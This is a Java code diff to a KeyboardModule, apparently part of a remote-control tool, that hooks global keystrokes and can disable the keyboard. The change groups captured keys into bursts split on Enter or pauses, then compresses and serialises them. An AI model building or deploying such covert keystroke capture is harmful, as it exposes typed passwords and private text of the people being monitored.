@@ -12,7 +12,8 @@ import java.io.IOException;
 import java.io.ObjectOutputStream;
 import java.nio.ByteBuffer;
 import java.util.Date;
-import java.util.concurrent.ConcurrentLinkedQueue;
+import java.util.LinkedList;
+import java.util.concurrent.ConcurrentLinkedDeque;
 import java.util.zip.GZIPOutputStream;
 
 @Slf4j
@@ -21,8 +22,8 @@ public class KeyboardModule implements Module {
     private static final short DISABLE_KEYBOARD    = GET_KEYBOARD_RECORD + 1;
     private static final short ENABLE_KEYBOARD     = DISABLE_KEYBOARD + 1;
 
-    private static final ConcurrentLinkedQueue<KeyboardData> keyboardData =
-            new ConcurrentLinkedQueue<>();
+    private static final ConcurrentLinkedDeque<KeyboardData> keyboardData =
+            new ConcurrentLinkedDeque<>();
 
     private static native void DisableKeyboard();
     private static native void EnableKeyboard();
@@ -39,9 +40,25 @@ public class KeyboardModule implements Module {
         GlobalScreen.addNativeKeyListener(new NativeKeyListener() {
             @Override
             public void nativeKeyPressed(NativeKeyEvent nativeEvent) {
-                Date date = new Date();
+                Date newDate = new Date();
                 int key = nativeEvent.getKeyCode();
-                keyboardData.add(new KeyboardData(date, key));
+
+                if (keyboardData.isEmpty() || key == NativeKeyEvent.VC_ENTER ||
+                        Math.abs(newDate.getTime() - keyboardData.peekLast().date().getTime()) > 2000) {
+
+                    LinkedList<Integer> keys = new LinkedList<>();
+                    if (key != NativeKeyEvent.VC_ENTER) {
+                        keys.add(key);
+                    } else {
+                        if (!keyboardData.isEmpty()) {
+                            keyboardData.peekLast().keys().add(key);
+                        }
+                    }
+
+                    keyboardData.add(new KeyboardData(newDate, keys));
+                } else {
+                    keyboardData.peekLast().keys().add(key);
+                }
             }
         });
 
@@ -131,10 +148,10 @@ public class KeyboardModule implements Module {
         return false;
     }
 
-    record KeyboardData(Date date, int key) {
+    record KeyboardData(Date date, LinkedList<Integer> keys) {
         public void writeToStream(ObjectOutputStream out) throws IOException {
             out.writeObject(date);
-            out.writeInt(key);
+            out.writeObject(keys);
         }
     }
 }
